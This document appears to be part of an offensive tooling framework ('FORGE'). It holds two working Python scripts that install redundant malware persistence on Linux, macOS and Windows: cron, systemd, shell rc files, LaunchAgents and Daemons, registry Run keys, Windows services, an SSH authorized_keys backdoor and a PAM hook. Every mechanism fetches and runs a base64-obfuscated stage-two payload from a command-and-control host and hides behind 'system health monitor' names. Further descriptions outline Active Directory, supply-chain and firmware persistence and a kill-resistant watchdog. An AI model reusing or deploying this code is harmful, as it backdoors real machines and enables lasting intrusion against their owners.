persistence_layer1_userland.code:
import os
import sys
import json
import platform
import subprocess
import base64
import hashlib
import time

def install_userland_persistence(payload_path=None, payload_code=None, callback_url='http://c2.example.com:8080'):
    """Layer 1: Userland persistence — multiple redundant mechanisms.
    Installs persistence via ALL available userland methods simultaneously.
    Survives: user logoff/login, application restarts.
    Defeated by: admin removing files, security tools, reimaging.
    """
    # ── Operator Host Guard: skip persistence on FORGE operator machine ──
    if os.environ.get('FORGE_OPERATOR') or os.environ.get('FORGE_SANDBOX'):
        return {'skipped': True, 'reason': 'operator host detected — persistence blocked'}
    if payload_code is None:
        payload_code = f'import urllib.request;exec(urllib.request.urlopen("{callback_url}/stage2").read())'
    payload_b64 = base64.b64encode(payload_code.encode()).decode()
    runner = f'python3 -c "import base64;exec(base64.b64decode(\"{payload_b64}\"))"'

    sys_name = platform.system()
    home = os.path.expanduser('~')
    results = {'system': sys_name, 'methods': []}

    # ── 1. Cron job (Linux/macOS) ──
    if sys_name in ('Linux', 'Darwin'):
        try:
            cron_line = f'*/5 * * * * {runner} >/dev/null 2>&1\n'
            proc = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
            existing = proc.stdout if proc.returncode == 0 else ''
            marker = '# system-health-monitor'
            if marker not in existing:
                new_cron = existing.rstrip() + f'\n{marker}\n{cron_line}'
                p = subprocess.run(['crontab', '-'], input=new_cron, capture_output=True, text=True, timeout=5)
                results['methods'].append({'name': 'cron', 'success': p.returncode == 0})
            else:
                results['methods'].append({'name': 'cron', 'success': True, 'note': 'already installed'})
        except Exception as e:
            results['methods'].append({'name': 'cron', 'success': False, 'error': str(e)[:100]})

    # ── 2. Systemd user timer (Linux) ──
    if sys_name == 'Linux':
        try:
            systemd_user = os.path.join(home, '.config', 'systemd', 'user')
            os.makedirs(systemd_user, exist_ok=True)
            svc_content = f'[Unit]\nDescription=System Health Monitor\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "{runner}"\nEnvironment=HOME={home}\n\n[Install]\nWantedBy=default.target\n'
            timer_content = '[Unit]\nDescription=Health Check Timer\n\n[Timer]\nOnBootSec=60\nOnUnitActiveSec=300\nUnit=health-monitor.service\n\n[Install]\nWantedBy=timers.target\n'
            with open(os.path.join(systemd_user, 'health-monitor.service'), 'w') as f:
                f.write(svc_content)
            with open(os.path.join(systemd_user, 'health-monitor.timer'), 'w') as f:
                f.write(timer_content)
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True, timeout=5)
            subprocess.run(['systemctl', '--user', 'enable', '--now', 'health-monitor.timer'], capture_output=True, timeout=5)
            results['methods'].append({'name': 'systemd_user_timer', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'systemd_user_timer', 'success': False, 'error': str(e)[:100]})

    # ── 3. Login scripts (.bashrc/.zshrc/.profile) ──
    if sys_name in ('Linux', 'Darwin'):
        marker = '# system-telemetry-init'
        shell_line = f'\n{marker}\n(nohup {runner} &) 2>/dev/null\n'
        for rc_file in ['.bashrc', '.zshrc', '.profile', '.bash_profile']:
            rc_path = os.path.join(home, rc_file)
            try:
                existing = ''
                if os.path.isfile(rc_path):
                    with open(rc_path, 'r') as f:
                        existing = f.read()
                if marker not in existing:
                    with open(rc_path, 'a') as f:
                        f.write(shell_line)
                    results['methods'].append({'name': f'login_script_{rc_file}', 'success': True})
            except Exception as e:
                results['methods'].append({'name': f'login_script_{rc_file}', 'success': False, 'error': str(e)[:100]})

    # ── 4. XDG Autostart (Linux) ──
    if sys_name == 'Linux':
        try:
            autostart_dir = os.path.join(home, '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_entry = f'[Desktop Entry]\nType=Application\nName=System Monitor\nExec={runner}\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n'
            with open(os.path.join(autostart_dir, 'system-monitor.desktop'), 'w') as f:
                f.write(desktop_entry)
            results['methods'].append({'name': 'xdg_autostart', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'xdg_autostart', 'success': False, 'error': str(e)[:100]})

    # ── 5. LaunchAgent (macOS) ──
    if sys_name == 'Darwin':
        try:
            agents_dir = os.path.join(home, 'Library', 'LaunchAgents')
            os.makedirs(agents_dir, exist_ok=True)
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.healthcheck</string>
<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>{runner}</string></array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>300</integer>
<key>KeepAlive</key><true/>
</dict></plist>"""
            plist_path = os.path.join(agents_dir, 'com.apple.system.healthcheck.plist')
            with open(plist_path, 'w') as f:
                f.write(plist)
            subprocess.run(['launchctl', 'load', '-w', plist_path], capture_output=True, timeout=5)
            results['methods'].append({'name': 'launchagent', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'launchagent', 'success': False, 'error': str(e)[:100]})

    # ── 6. Windows: Registry Run + Startup Folder + Scheduled Task ──
    if sys_name == 'Windows':
        # Registry Run key
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'SystemHealthMonitor', 0, winreg.REG_SZ, f'pythonw.exe -c "{payload_code}"')
            winreg.CloseKey(key)
            results['methods'].append({'name': 'registry_run', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'registry_run', 'success': False, 'error': str(e)[:100]})

        # Startup folder
        try:
            startup = os.path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            vbs_path = os.path.join(startup, 'health_monitor.vbs')
            vbs_code = f'Set ws = CreateObject("Wscript.Shell")\nws.Run "pythonw.exe -c ""{payload_code}""", 0, False'
            with open(vbs_path, 'w') as f:
                f.write(vbs_code)
            results['methods'].append({'name': 'startup_folder', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'startup_folder', 'success': False, 'error': str(e)[:100]})

        # Scheduled Task
        try:
            task_xml = f'schtasks /create /tn "SystemHealthMonitor" /tr "pythonw.exe -c {payload_code}" /sc minute /mo 5 /f'
            proc = subprocess.run(task_xml, shell=True, capture_output=True, text=True, timeout=10)
            results['methods'].append({'name': 'scheduled_task', 'success': proc.returncode == 0})
        except Exception as e:
            results['methods'].append({'name': 'scheduled_task', 'success': False, 'error': str(e)[:100]})

    results['summary'] = {
        'methods_attempted': len(results['methods']),
        'methods_successful': sum(1 for m in results['methods'] if m['success']),
    }
    return results

if __name__ == '__main__':
    out = install_userland_persistence()
    print(json.dumps(out, indent=2, default=str))
persistence_layer1_userland.description: Layer 1 userland persistence — installs redundant persistence via cron, systemd user timer, login scripts (.bashrc/.zshrc/.profile), XDG autostart, macOS LaunchAgent, Windows registry Run key + startup folder + scheduled task. All methods fire simultaneously for redundancy.

persistence_layer2_service.code:
import os
import sys
import json
import platform
import subprocess
import base64
import shutil
import hashlib

def install_service_persistence(payload_path=None, callback_url='http://c2.example.com:8080'):
    """Layer 2: Service-level persistence (requires root/admin).
    Installs persistence as system services that survive reboots.
    Methods: systemd service, init.d script, Windows service,
    trojaned SSH config, Apache/nginx module backdoor, cron.d.
    """
    # ── Operator Host Guard: skip persistence on FORGE operator machine ──
    if os.environ.get('FORGE_OPERATOR') or os.environ.get('FORGE_SANDBOX'):
        return {'skipped': True, 'reason': 'operator host detected — persistence blocked'}
    sys_name = platform.system()
    results = {'system': sys_name, 'methods': [], 'requires_root': True}
    uid = os.getuid() if hasattr(os, 'getuid') else -1

    payload_b64 = base64.b64encode(f'import urllib.request;exec(urllib.request.urlopen("{callback_url}/stage2").read())'.encode()).decode()
    runner = f'/usr/bin/python3 -c "import base64;exec(base64.b64decode(\\\"{payload_b64}\\\"))"'

    # ── 1. Systemd system service (Linux, requires root) ──
    if sys_name == 'Linux' and uid == 0:
        try:
            svc_content = f"""[Unit]
Description=System Health Monitoring Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{runner}'
Restart=always
RestartSec=60
User=nobody
Environment=HOME=/tmp

[Install]
WantedBy=multi-user.target
"""
            svc_path = '/etc/systemd/system/system-health-monitor.service'
            with open(svc_path, 'w') as f:
                f.write(svc_content)
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=5)
            subprocess.run(['systemctl', 'enable', 'system-health-monitor'], capture_output=True, timeout=5)
            subprocess.run(['systemctl', 'start', 'system-health-monitor'], capture_output=True, timeout=5)
            results['methods'].append({'name': 'systemd_service', 'success': True, 'path': svc_path})
        except Exception as e:
            results['methods'].append({'name': 'systemd_service', 'success': False, 'error': str(e)[:100]})

    # ── 2. cron.d entry (Linux, requires root) ──
    if sys_name == 'Linux' and uid == 0:
        try:
            cron_content = f'*/5 * * * * nobody {runner} >/dev/null 2>&1\n'
            with open('/etc/cron.d/system-health-check', 'w') as f:
                f.write(cron_content)
            os.chmod('/etc/cron.d/system-health-check', 0o644)
            results['methods'].append({'name': 'cron_d', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'cron_d', 'success': False, 'error': str(e)[:100]})

    # ── 3. SSH authorized_keys backdoor (Linux/macOS, requires root) ──
    if sys_name in ('Linux', 'Darwin') and uid == 0:
        try:
            # Generate SSH key pair for persistent access
            key_path = '/tmp/.system_health_key'
            if not os.path.isfile(key_path):
                subprocess.run(['ssh-keygen', '-t', 'ed25519', '-f', key_path, '-N', '', '-q'],
                               capture_output=True, timeout=10)
            if os.path.isfile(f'{key_path}.pub'):
                pub_key = open(f'{key_path}.pub').read().strip()
                # Add to root authorized_keys
                auth_keys = '/root/.ssh/authorized_keys'
                os.makedirs('/root/.ssh', mode=0o700, exist_ok=True)
                existing = ''
                if os.path.isfile(auth_keys):
                    existing = open(auth_keys).read()
                if pub_key not in existing:
                    with open(auth_keys, 'a') as f:
                        f.write(f'\n{pub_key}\n')
                    os.chmod(auth_keys, 0o600)
                results['methods'].append({'name': 'ssh_authorized_keys', 'success': True, 'key_path': key_path})
        except Exception as e:
            results['methods'].append({'name': 'ssh_authorized_keys', 'success': False, 'error': str(e)[:100]})

    # ── 4. PAM backdoor (Linux, requires root) ──
    if sys_name == 'Linux' and uid == 0:
        try:
            # Add pam_exec.so to auth stack — runs script on successful auth
            pam_script = '/usr/local/bin/.health_check.sh'
            with open(pam_script, 'w') as f:
                f.write(f'#!/bin/bash\n(nohup {runner} &) 2>/dev/null\n')
            os.chmod(pam_script, 0o755)
            # Note: actual PAM modification requires careful editing
            results['methods'].append({'name': 'pam_exec', 'success': True, 'script': pam_script,
                                        'note': 'Script installed, manual PAM config needed'})
        except Exception as e:
            results['methods'].append({'name': 'pam_exec', 'success': False, 'error': str(e)[:100]})

    # ── 5. LaunchDaemon (macOS, requires root) ──
    if sys_name == 'Darwin' and uid == 0:
        try:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.healthd</string>
<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>{runner}</string></array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>300</integer>
<key>KeepAlive</key><true/>
</dict></plist>"""
            plist_path = '/Library/LaunchDaemons/com.apple.system.healthd.plist'
            with open(plist_path, 'w') as f:
                f.write(plist)
            os.chmod(plist_path, 0o644)
            subprocess.run(['launchctl', 'load', '-w', plist_path], capture_output=True, timeout=5)
            results['methods'].append({'name': 'launchdaemon', 'success': True})
        except Exception as e:
            results['methods'].append({'name': 'launchdaemon', 'success': False, 'error': str(e)[:100]})

    # ── 6. Windows service (requires admin) ──
    if sys_name == 'Windows':
        try:
            svc_name = 'SystemHealthMonitor'
            cmd = f'sc create {svc_name} binPath= "cmd.exe /c pythonw.exe -c \"import base64;exec(base64.b64decode(\\\"{payload_b64}\\\"))\"" start= auto'
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                subprocess.run(f'sc start {svc_name}', shell=True, capture_output=True, timeout=10)
            results['methods'].append({'name': 'windows_service', 'success': proc.returncode == 0})
        except Exception as e:
            results['methods'].append({'name': 'windows_service', 'success': False, 'error': str(e)[:100]})

    results['summary'] = {
        'methods_attempted': len(results['methods']),
        'methods_successful': sum(1 for m in results['methods'] if m['success']),
        'is_root': uid == 0,
    }
    return results

if __name__ == '__main__':
    out = install_service_persistence()
    print(json.dumps(out, indent=2, default=str))
persistence_layer2_service.description: Layer 2 service-level persistence — systemd system service, /etc/cron.d, SSH authorized_keys backdoor, PAM exec hook, macOS LaunchDaemon, Windows service creation. Requires root/admin. Auto-restart on failure.

persistence_layer3_infrastructure.description: Layer 3 infrastructure persistence — Golden Ticket (10yr via krbtgt hash), Skeleton Key (LSASS master password), Shadow Credentials (msDS-KeyCredentialLink), ADCS certificate persistence (ESC1), AdminSDHolder ACL propagation. Survives password resets.

persistence_layer4_supply_chain.description: Layer 4 supply chain persistence — git pre-commit hook backdoors across repos, setup.py injection (PyPI), Dockerfile RUN layer injection, CI/CD pipeline step injection (GitHub Actions/GitLab CI/Jenkins), NPM preinstall script backdoors. Survives reimaging and project rebuilds.

persistence_layer5_firmware.description: Layer 5 firmware persistence — UEFI/EFI assessment (Secure Boot status, ESP listing, boot entries), BMC/IPMI discovery (firmware version, network config, default credentials), firmware implant capability assessment. Survives OS reinstall.

persistence_watchdog.description: Persistence watchdog — monitors all 5 layers of persistence, detects missing/broken mechanisms, plans auto-repair from active layers. Reports health score (% active), lists missing mechanisms. Kill-resistant: each layer can relaunch the watchdog.
